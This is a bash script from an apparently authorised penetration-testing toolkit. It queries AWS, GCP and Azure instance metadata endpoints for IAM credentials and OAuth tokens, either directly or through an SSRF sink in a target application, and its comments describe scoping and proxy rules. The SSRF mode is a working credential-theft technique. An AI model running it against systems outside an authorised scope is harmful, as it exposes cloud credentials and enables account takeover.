#!/bin/bash
set -euo pipefail
# Nimbus — probe cloud metadata (IMDS) reachability. Non-destructive (read-only GET).
# Run this ONLY from an in-scope instance, or pass an SSRF fetch wrapper URL.
#
# Usage:
#   metadata-probe.sh direct                 # from inside an in-scope instance
#   metadata-probe.sh ssrf "https://app/fetch?url="   # via an SSRF sink (URL-prefix)
#
# Egress — two kinds of traffic handled oppositely:
#   * direct mode queries the HOST'S OWN link-local IMDS (169.254.169.254 / metadata.google.internal).
#     That is host infrastructure, NOT target traffic, so it must never ride the program's egress
#     proxy — and a proxy left in the environment by the calling harness must not hijack it. Every
#     direct-mode curl is pinned with `--noproxy '*'` so it always goes straight to the host IMDS.
#   * ssrf mode sends its request to the TARGET's SSRF sink (the URL prefix). That IS target traffic,
#     so it honors the program's egress proxy (roe.json "proxy" / GRIMNIR_PROXY) or refuses (exit 4).

MODE="${1:?Usage: metadata-probe.sh direct | ssrf <url-prefix>}"
PREFIX="${2:-}"

if [[ "$MODE" == ssrf ]]; then
  # ssrf traffic reaches the target: route it through the program's egress proxy or refuse.
  # No project dir here, so egress_init reads GRIMNIR_PROXY from the environment; curl rides the
  # exported ALL_PROXY/HTTP(S)_PROXY.
  source "$(dirname "${BASH_SOURCE[0]}")/../../scripts/egress-env.sh"
  egress_init "" || exit 4
fi

fetch() { # $1 = metadata url
  local url="$1"
  if [[ "$MODE" == direct ]]; then
    curl -s --noproxy '*' --max-time 5 "$url"
  else
    curl -s --max-time 8 "${PREFIX}$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$url")"
  fi
}

echo "== AWS IMDSv1 =="
fetch "http://169.254.169.254/latest/meta-data/iam/security-credentials/" ; echo
echo "== AWS IMDSv2 token (PUT needed; if blank, IMDSv2 likely enforced = mitigated) =="
[[ "$MODE" == direct ]] && curl -s --noproxy '*' --max-time 5 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" ; echo
echo "== GCP (needs header Metadata-Flavor: Google) =="
[[ "$MODE" == direct ]] && curl -s --noproxy '*' --max-time 5 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" ; echo
echo "== Azure (needs header Metadata: true) =="
[[ "$MODE" == direct ]] && curl -s --noproxy '*' --max-time 5 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" ; echo
echo
echo "[note] Creds returned != exploitable. Confirm with sts get-caller-identity (or equiv) from your context, plus a negative control (IMDSv2-enforced host)."
